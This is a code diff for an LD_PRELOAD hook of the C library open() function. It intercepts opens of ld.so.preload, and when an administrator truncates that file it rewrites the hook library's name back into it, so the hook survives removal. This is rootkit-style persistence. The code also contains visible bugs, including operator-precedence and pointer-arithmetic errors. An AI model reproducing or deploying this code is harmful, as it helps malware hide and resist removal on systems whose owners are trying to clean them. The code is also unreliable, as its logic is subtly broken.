@@ -12,50 +12,55 @@ int open(const char *pathname, int flags, mode_t mode) {
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
 	std::string file (pathname);
 	size_t ind;
-	char chArr[3]; // just in case for utf-16 coding with 2-bytes symbols
+	char chArr[2]; // just in case for utf-16 coding with 2-bytes symbols
 	
 	
 	assert (opnPtr != NULL);
+	assert (rdPtr != NULL);
 	
 	ind = file.find_last_of ('/', 0);
 	++ind;
 	if (ind != std::string::npos) file.assign (file, ind, file.length () - ind);
+	
+	// Is the ld.so.preload opening ?
 	if (!strcmp (prelFileName, file.c_str ())) {
-		int fd = opnPtr (dynamic_cnf.txt, O_RDWR);
-		ind = rdPtr (fd, chArr, 2);
+		descr_holder fd (new int (-1));
+		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
+		// fcntl (); // to lock mandatory the file
+		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
 		
-		// We don't know have created or not the file. At default we think not.
-		// This situation is rather unlikely
+		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
 		if (-1 == ind) {
-			if (flags & (~O_CREAT))
-				return opnPtr (pathname, flags & (~O_TRUNC), mode);
+			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
+			else return -1;
+		}
+		// the file doesn't exist
+		if (chArr[0] == not_created) {
+			if (!flags & O_CREAT) return -1;
 			else {
-				serr.set (ENOENT);
-				return -1;
+				int ret = opnPtr (pathname, flags & (~O_TRUNC), mode);
+				if (ret != -1) while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
+				return ret;
 			}
 		}
-		
-		chArr[ind] = '\0';
-		// If we work with utf-16, not utf-8
-		if (chArr[0] == 0) {
-			chArr [0] = chArr[1];
-			chArr[1] = '\0';
-		}
-		
-		// Have created
-		if (chArr[0] == '1') {
+		// the file exists
+		if (flags & O_TRUNC) {
+			struct stat buf;
+			int ret = opnPtr (pathname, O_RDWR | O_TRUNC);
+			if (ret == -1) return ret;
 			
-		}
-		// Havn't created
-		else {
+			while (pwrite (ret,
+						   hookLibraryName.c_str () + ' ',
+						   hookLibraryName.size (), 0
+				  ) == -1 && errno == EINTR
+			);
 			
+			return opnPtr (pathname, flags & (~O_TRUNC), mode);
 		}
-		
-		
-		return -1;
+		return opnPtr (pathname, flags, mode);
 	}
 	
-	
+	// this file isn't intersted for us
 	return opnPtr (pathname, flags, mode);
 }
 
